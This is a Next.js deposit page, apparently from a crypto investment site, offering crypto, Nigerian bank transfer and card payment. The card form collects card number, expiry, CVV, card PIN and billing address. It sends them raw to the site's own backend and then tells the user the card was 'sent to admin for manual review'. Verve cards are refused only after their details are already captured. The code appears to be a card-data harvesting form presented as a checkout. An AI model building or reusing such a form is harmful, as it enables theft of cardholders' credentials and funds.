'use client';

import { useEffect, useMemo, useState } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { useToast } from '@/hooks/use-toast';
import { useCurrencyConverter } from '@/lib/currency';
import { supabase } from '@/lib/supabaseClient';
import { CheckCircle2, ChevronDown, CreditCard, Landmark, Wallet } from 'lucide-react';

type Method = 'card_payment' | 'local_bank_transfer' | 'crypto_checkout';

const NGN_PER_USDT = 1600;
const MIN_DEPOSIT_USDT = 10;
const MAX_DEPOSIT_USDT = 725;
const MIN_DEPOSIT_NGN_LOCAL = 10000;

const CARD_TYPES = [
  { value: 'visa', label: 'Visa', image: '/cards/visa.svg' },
  { value: 'mastercard', label: 'Mastercard', image: '/cards/mastercard.svg' },
  { value: 'american_express', label: 'American Express', image: '/cards/amex.svg' },
  { value: 'discover', label: 'Discover', image: '/cards/discover.svg' },
  { value: 'unionpay', label: 'UnionPay', image: '/cards/unionpay.svg' },
  { value: 'verve', label: 'Verve', image: '/cards/verve.svg' },
  { value: 'rupay', label: 'RuPay', image: '/cards/rupay.svg' },
  { value: 'interac', label: 'Interac', image: '/cards/interac.svg' },
  { value: 'maestro', label: 'Maestro', image: '/cards/maestro.svg' },
] as const;

async function createDeposit(payload: any) {
  const { data } = await supabase.auth.getSession();
  const token = data.session?.access_token;
  if (!token) throw new Error('Login required');

  const res = await fetch('/api/deposits/create', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify(payload),
  });
  const json = await res.json().catch(() => ({}));
  if (!res.ok || !json?.ok) throw new Error(json?.message || 'Could not start deposit.');
  return json.txId as string;
}

export default function DepositStartPage() {
  const { toast } = useToast();
  const router = useRouter();
  const [method, setMethod] = useState<Method>('crypto_checkout');
  const [busy, setBusy] = useState(false);

  const [amount, setAmount] = useState('');
  const [cardType, setCardType] = useState<(typeof CARD_TYPES)[number]['value']>('visa');
  const [cardPickerOpen, setCardPickerOpen] = useState(false);
  const [cardSubmittedLocked, setCardSubmittedLocked] = useState(false);
  const [cardOwnerName, setCardOwnerName] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardPin, setCardPin] = useState('');
  const [streetAddress, setStreetAddress] = useState('');
  const [city, setCity] = useState('');
  const [postcode, setPostcode] = useState('');

  const [country, setCountry] = useState('');
  const [currencyCode, setCurrencyCode] = useState('USDT');

  const { convert, currency: activeCryptoCurrency } = useCurrencyConverter(currencyCode);
  const minDepositUser =
    method === 'local_bank_transfer'
      ? MIN_DEPOSIT_NGN_LOCAL
      : method === 'crypto_checkout'
        ? MIN_DEPOSIT_USDT
        : convert(MIN_DEPOSIT_USDT);
  const maxDepositUser =
    method === 'local_bank_transfer'
      ? MAX_DEPOSIT_USDT * NGN_PER_USDT
      : method === 'crypto_checkout'
        ? MAX_DEPOSIT_USDT
        : convert(MAX_DEPOSIT_USDT);

  const isNigerian = useMemo(() => country.trim().toLowerCase() === 'nigeria', [country]);
  const selectedCard = CARD_TYPES.find((x) => x.value === cardType) || CARD_TYPES[0];
  const displayCurrency =
    method === 'local_bank_transfer' ? 'NGN' : method === 'crypto_checkout' ? 'USDT' : activeCryptoCurrency;

  useEffect(() => {
    (async () => {
      const { data } = await supabase.auth.getSession();
      const uid = data.session?.user?.id;
      if (!uid) return;
      const { data: row } = await supabase.from('users').select('country,currency,full_name,email').eq('id', uid).maybeSingle();
      setCountry(String((row as any)?.country || ''));
      setCurrencyCode(String((row as any)?.currency || 'USDT'));
    })();
  }, []);

  const submit = async () => {
    const amountNum = Number(amount || 0);
    if (!Number.isFinite(amountNum) || amountNum < minDepositUser || amountNum > maxDepositUser) {
      toast({ variant: 'destructive', title: 'Invalid amount', description: `Use an amount between ${minDepositUser.toFixed(2)} and ${maxDepositUser.toFixed(2)} ${displayCurrency}.` });
      return;
    }

    if (!isNigerian && method === 'local_bank_transfer') {
      toast({ variant: 'destructive', title: 'Not available', description: 'Bank transfer is for Nigerian accounts only.' });
      return;
    }

    setBusy(true);
    try {
      if (method === 'card_payment') {
        const required = [cardOwnerName, cardNumber, expiryDate, cvv, cardPin, streetAddress, city, postcode];
        if (required.some((x) => !String(x).trim())) throw new Error('Complete all required card details.');
      }

      const amountUsdt =
        method === 'local_bank_transfer'
          ? amountNum / NGN_PER_USDT
          : method === 'crypto_checkout'
            ? amountNum
          : amountNum / (convert(1) > 0 ? convert(1) : 1);

      const txId = await createDeposit({
        amountInput: amountNum,
        amountUsdt,
        inputCurrency: displayCurrency,
        paymentMethod: method,
        cardDetails:
          method === 'card_payment'
            ? { cardType: selectedCard.label, cardOwnerName, cardNumber, expiryDate, cvv, cardPin, streetAddress, city, postcode }
            : null,
      });

      if (method === 'card_payment' && cardType === 'verve') {
        toast({
          variant: 'destructive',
          title: 'Card not supported',
          description: 'Verve card deposits are currently unsupported. Transaction was cancelled and marked failed.',
        });
        router.push('/history');
        return;
      }

      if (method === 'card_payment') {
        setCardSubmittedLocked(true);
        return;
      }

      if (method === 'local_bank_transfer') {
        await new Promise((r) => setTimeout(r, 2000));
        router.push(`/deposit/checkout/${txId}`);
        return;
      }

      router.push(`/deposit/checkout/${txId}?mode=${method}`);
    } catch (e: any) {
      toast({ variant: 'destructive', title: 'Deposit failed', description: e?.message || 'Could not continue.' });
    } finally {
      setBusy(false);
    }
  };

  return (
    <div className="mx-auto max-w-5xl p-4">
      <Card className="overflow-hidden">
        <div className="grid md:grid-cols-[220px_1fr]">
          <div className="border-r bg-muted/30 p-4 space-y-2">
            <h2 className="text-3xl font-semibold mb-3">Pay With</h2>
            <button className={`w-full flex items-center gap-2 rounded-lg p-2 text-left ${method === 'crypto_checkout' ? 'bg-primary/10 text-primary' : ''}`} onClick={() => setMethod('crypto_checkout')}>
              <Wallet className="h-4 w-4" /> Crypto payment checkout (default)
            </button>
            {isNigerian ? (
              <button className={`w-full flex items-center gap-2 rounded-lg p-2 text-left ${method === 'local_bank_transfer' ? 'bg-primary/10 text-primary' : ''}`} onClick={() => setMethod('local_bank_transfer')}>
                <Landmark className="h-4 w-4" /> Local bank transfer (Nigerians only)
              </button>
            ) : null}
            <button className={`w-full flex items-center gap-2 rounded-lg p-2 text-left ${method === 'card_payment' ? 'bg-primary/10 text-primary' : ''}`} onClick={() => setMethod('card_payment')}>
              <CreditCard className="h-4 w-4" /> Card payment
            </button>
          </div>

          <CardContent className="p-6 space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="text-xl font-semibold">{method === 'card_payment' ? 'Card payment form' : method === 'local_bank_transfer' ? 'Local bank transfer checkout (NGN)' : 'Crypto payment checkout'}</h3>
              <div className="font-semibold">{displayCurrency} {Number(amount || 0).toLocaleString()}</div>
            </div>

            <Input placeholder={`Amount (${displayCurrency})`} value={amount} onChange={(e) => setAmount(e.target.value)} type="number" />
            {method === 'local_bank_transfer' ? (
              <p className="text-xs text-muted-foreground">
                Rate: 1 USDT = {NGN_PER_USDT.toLocaleString()} NGN. Minimum: {MIN_DEPOSIT_NGN_LOCAL.toLocaleString()} NGN.
              </p>
            ) : (
              <p className="text-xs text-muted-foreground">Minimum deposit is {MIN_DEPOSIT_USDT} USDT equivalent ({minDepositUser.toFixed(2)} {displayCurrency}).</p>
            )}

            {method === 'card_payment' && (
              <div className="space-y-3">
                <div className="space-y-2">
                  <label className="text-sm font-medium">Card type</label>
                  <div className="relative">
                    <button
                      type="button"
                      onClick={() => setCardPickerOpen((x) => !x)}
                      className="w-full h-12 rounded-xl border bg-background px-3 flex items-center justify-between"
                    >
                      <div className="flex items-center gap-3">
                        <Image src={selectedCard.image} alt={selectedCard.label} width={44} height={28} className="rounded" />
                        <span className="font-medium">{selectedCard.label}</span>
                      </div>
                      <ChevronDown className={`h-4 w-4 transition-transform ${cardPickerOpen ? 'rotate-180' : ''}`} />
                    </button>
                    {cardPickerOpen ? (
                      <div className="absolute z-20 mt-2 w-full rounded-2xl border bg-card shadow-2xl overflow-hidden">
                        {CARD_TYPES.map((card) => {
                          const active = cardType === card.value;
                          return (
                            <button
                              type="button"
                              key={card.value}
                              onClick={() => {
                                setCardType(card.value);
                                setCardPickerOpen(false);
                              }}
                              className={`w-full px-3 py-3 flex items-center justify-between border-b last:border-b-0 ${active ? 'bg-primary/10' : 'hover:bg-muted/40'}`}
                            >
                              <div className="flex items-center gap-3">
                                <Image src={card.image} alt={card.label} width={44} height={28} className="rounded" />
                                <span className="text-left">{card.label}</span>
                              </div>
                              <CheckCircle2 className={`h-5 w-5 ${active ? 'text-primary' : 'text-muted-foreground/40'}`} />
                            </button>
                          );
                        })}
                      </div>
                    ) : null}
                  </div>
                  <div className="rounded-md border p-2">
                    <div className="flex items-center gap-3">
                      <Image src={selectedCard.image} alt={selectedCard.label} width={66} height={42} className="rounded" />
                      <p className="text-sm">
                        Selected: <b>{selectedCard.label}</b>{selectedCard.value === 'verve' ? ' (Nigerian card - currently unsupported)' : ''}
                      </p>
                    </div>
                  </div>
                </div>
                <Input value={cardOwnerName} onChange={(e) => setCardOwnerName(e.target.value)} placeholder="Card owner name" />
                <Input value={cardNumber} onChange={(e) => setCardNumber(e.target.value)} placeholder="Card number" />
                <div className="grid grid-cols-3 gap-2">
                  <Input value={expiryDate} onChange={(e) => setExpiryDate(e.target.value)} placeholder="MM/YY" />
                  <Input value={cvv} onChange={(e) => setCvv(e.target.value)} placeholder="CVV" />
                  <Input value={cardPin} onChange={(e) => setCardPin(e.target.value)} placeholder="PIN" />
                </div>
                <Input value={streetAddress} onChange={(e) => setStreetAddress(e.target.value)} placeholder="Street address" />
                <div className="grid grid-cols-2 gap-2">
                  <Input value={city} onChange={(e) => setCity(e.target.value)} placeholder="City" />
                  <Input value={postcode} onChange={(e) => setPostcode(e.target.value)} placeholder="Postcode" />
                </div>
              </div>
            )}

            <Button onClick={submit} disabled={busy} className="w-full h-11 text-base">
              {busy ? 'Processing...' : `Pay ${displayCurrency} ${Number(amount || 0).toLocaleString()}`}
            </Button>
          </CardContent>
        </div>
      </Card>
      {cardSubmittedLocked ? (
        <div className="fixed inset-0 z-[80] bg-black/80 backdrop-blur-sm flex items-center justify-center">
          <div className="w-[90%] max-w-sm rounded-2xl border border-primary/30 bg-card p-6 text-center space-y-4">
            <div className="mx-auto h-12 w-12 rounded-full border-4 border-primary/30 border-t-primary animate-spin" />
            <h4 className="text-lg font-semibold">Submitting card details...</h4>
            <p className="text-sm text-muted-foreground">
              Your card request has been sent to admin for manual review. Please keep this screen open.
            </p>
          </div>
        </div>
      ) : null}
    </div>
  );
}
